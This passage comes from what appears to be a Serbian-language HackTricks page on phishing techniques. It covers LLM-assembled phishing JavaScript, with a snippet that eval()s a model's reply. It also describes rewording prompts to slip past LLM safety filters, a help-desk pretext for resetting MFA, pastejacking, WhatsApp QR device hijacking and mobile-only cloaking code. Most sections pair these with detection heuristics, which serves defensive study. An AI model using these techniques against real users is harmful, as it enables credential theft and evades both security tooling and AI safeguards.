|Agentni AI|Samostalna registracija domena, prikupljanje open-source intel podataka i sastavljanje narednih e-poruka kada žrtva klikne, ali ne pošalje pristupne podatke.|

**Odbrana:**  
• Dodajte **dinamičke bannere** koji ističu poruke poslate automatizovanim sistemima kojima se ne veruje (na osnovu anomalija u ARC/DKIM-u).  
• Za telefonske zahteve visokog rizika uvedite **fraze za proveru glasovne biometrije**.  
• Neprestano simulirajte mamce generisane pomoću AI-ja u programima za podizanje svesti — statički šabloni su zastareli.

Pogledajte i — zloupotrebu agentnog pregledanja za krađu pristupnih podataka putem phishinga:

{{#ref}}
ai-agent-mode-phishing-abusing-hosted-agent-browsers.md
{{#endref}}

Pogledajte i — zloupotrebu lokalnih CLI alata i MCP-a od strane AI agenata (za inventar tajni i detekciju):

{{#ref}}
ai-agent-abuse-local-ai-cli-tools-and-mcp.md
{{#endref}}

## Sklapanje phishing JavaScript-a tokom izvršavanja uz pomoć LLM-a (generisanje koda u browser-u)

Napadači mogu da isporuče HTML koji deluje bezazleno, a zatим **generišu stealer tokom izvršavanja** tako što zatraže JavaScript od **pouzdanog LLM API-ja**, a zatim ga izvrše u browser-u (npr. pomoću `eval` ili dinamičkog `<script>` taga).<sup>[[8]](#references)</sup>

1. **Prompt kao obfuskacija:** kodirajte URL-ove za eksfiltraciju/Base64 stringove u promptu; menjajte formulaciju da biste zaobišli bezbednosne filtere i smanjili halucinacije.
2. **API poziv sa klijentske strane:** pri učitavanju, JS poziva javni LLM (Gemini/DeepSeek/itd.) ili CDN proxy; u statičkom HTML-u nalaze se samo prompt/API poziv.
3. **Sklapanje i izvršavanje:** nadovežite odgovor i izvršite ga (polimorfno pri svakoj poseti):

```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
  .then(r=>r.json())
  .then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```

4. **Phish/exfil:** generisani kod personalizuje mamac (npr. parsiranjem LogoKit tokena) i šalje pristupne podatke na endpoint skriven u promptu.

**Osobine izbegavanja detekcije**
- Saobraćaj ide ka poznatim LLM domenima ili proxy-jima renomiranih CDN-ova; ponekad se koristi WebSocket veza sa backend-om.
- Nema statičkog payload-a; zlonamerni JS postoji samo nakon renderovanja.
- Nedeterminističko generisanje stvara **jedinstvene** stealere za svaku sesiju.

**Ideje za detekciju**
- Pokrećite sandbox-e sa omogućenim JS-om; označite **runtime `eval`/dinamičko kreiranje skripti koje potiču iz odgovora LLM-a**.
- Tražite POST zahteve sa front-end-a ka LLM API-jima, neposredno praćene pozivom `eval`/`Function` nad vraćenim tekstom.
- Upozoravajte na neodobrene LLM domene u klijentskom saobraćaju, a zatim i na POST zahteve koji šalju pristupne podatke.

---

## MFA Fatigue / Push Bombing varijanta – prinudno resetovanje
Pored klasičnog push-bombing-a, operateri jednostavno **nameću novu MFA registraciju** tokom poziva službi za podršku, čime poništavaju postojeći token korisnika. Svaki naredni zahtev za prijavu žrtvi deluje legitimno.

```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```

Pratite događaje u AzureAD/AWS/Okta u kojima se **`deleteMFA` + `addMFA`** dešavaju **u roku od nekoliko minuta sa iste IP adrese**.



## Clipboard Hijacking / Pastejacking

Napadači mogu neprimetno da kopiraju zlonamerne komande u clipboard žrtve sa kompromitovane ili typosquatted veb-stranice, a zatim da navedu korisnika da ih nalepi u **Win + R**, **Win + X** ili prozor terminala, čime se izvršava proizvoljan kod bez preuzimanja ili priloga.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobilni phishing i distribucija zlonamernih aplikacija (Android i iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### Otmica povezivanja WhatsApp uređaja putem QR koda uz social engineering
* Stranica-mamac (npr. lažni „kanal” ministarstva/CERT-a) prikazuje QR kod za WhatsApp Web/Desktop i upućuje žrtvu da ga skenira, čime se napadač neprimetno dodaje kao **povezani uređaj**.<sup>[[12]](#references)</sup>
* Napadač odmah dobija uvid u četove i kontakte sve dok se sesija ne ukloni. Žrtve kasnije mogu da vide obaveštenje „povezan je novi uređaj”; branioci mogu da traže neočekivane događaje povezivanja uređaja ubrzo nakon poseta nepouzdanim QR stranicama.

### Phishing ograničen na mobilne uređaje radi izbegavanja crawlera i sandboxa
Operateri sve češće ograničavaju phishing tokove jednostavnom proverom uređaja, tako da desktop crawleri nikada ne stignu do završnih stranica. Čest obrazac je kratka skripta koja proverava da li DOM podržava dodir i šalje rezultat serverskoj krajnjoj tački; klijenti koji nisu mobilni dobijaju HTTP 500 (ili praznu stranicu), dok se mobilnim korisnicima prikazuje ceo tok.<sup>[[7]](#references)</sup>

Minimalni isečak klijentskog koda (tipična logika):

```html
<script src="/static/detect_device.js"></script>
```

Logika u `detect_device.js` (pojednostavljeno):

```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
  .then(()=>location.reload());
```

Ponašanje servera koje se često primećuje:
- Postavlja session cookie prilikom prvog učitavanja.
- Prihvata `POST /detect {"is_mobile":true|false}`.
- Vraća 500 (ili placeholder) pri narednim GET zahtevima kada je `is_mobile=false`; prikazuje phishing sadržaj samo ako je `true`.

Heuristike za potragu i detekciju:
- urlscan upit: `filename:"detect_device.js" AND page.status:500`
- Web telemetrija: niz `GET /static/detect_device.js` → `POST /detect` → HTTP 500 za uređaje koji nisu mobilni; legitimni putevi žrtava koje koriste mobilne uređaje vraćaju 200, a zatim HTML/JS sadržaj.
- Blokirajte ili dodatno proveravajte stranice koje prikazuju sadržaj isključivo na osnovu `ontouchstart` ili sličnih provera uređaja.

Saveti za odbranu:
- Pokrećite crawler-e sa fingerprint-ovima nalik onima na mobilnim uređajima i omogućenim JS-om da biste otkrili skriveni sadržaj.
- Upozoravajte na sumnjive odgovore 500 nakon `POST /detect` na novoregistrovanim domenima.

## References

- [1] [Generisanje varijacija domena koje se koriste u phishingu (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Pronalaženje phishinga: alati i tehnike (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Krađa akreditiva i zaobilaženje 2FA pomoću noVNC (mr.d0x)](https://mrd0x.com/bypass-2fa-using-novnc/)
- [4] [Krađa sesija i zaobilaženje 2FA pomoću EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [5] [Kako instalirati i konfigurisati DKIM sa Postfix-om na Debian Wheezy (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [6] [Izveštaj Unit 42 o globalnom odgovoru na incidente za 2025. – izdanje o društvenom inženjeringu](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [7] [Tihi smishing – infrastruktura phishinga ograničena na mobilne uređaje i heuristike (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [8] [Sledeća granica napada sklapanjem tokom izvršavanja: korišćenje LLM-ova za generisanje JavaScript-a za phishing u realnom vremenu](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [9] [Lažno predstavljanje, otmica klikova i TDS: uvid u ekosistem distribucije malvera](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [10] [Bitsquatting domena Windows.com (Remy Hax)](https://remyhax.xyz/posts/bitsquatting-windows/)
- [11] [Otmica saobraćaja ka Microsoft-ovom windows.com pomoću promene bitova (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [12] [Ljubav? Zapravo: lažna aplikacija za upoznavanje korišćena kao mamac u ciljanoj kampanji špijunskog softvera u Pakistanu](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [13] [ESET GhostChat IoC-ovi i uzorci](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [14] [Razotkrivanje AdFection-a: kako je Discover-Tech pretvorio ciljane oglase u kanal za špijunski softver za plaćenike bez potrebe za klikom](https://citizenlab.ca/research/how-discover-tech-turned-targeted-ads-into-a-pipeline-for-spyware/)
{{#include ../../banners/hacktricks-training.md}}
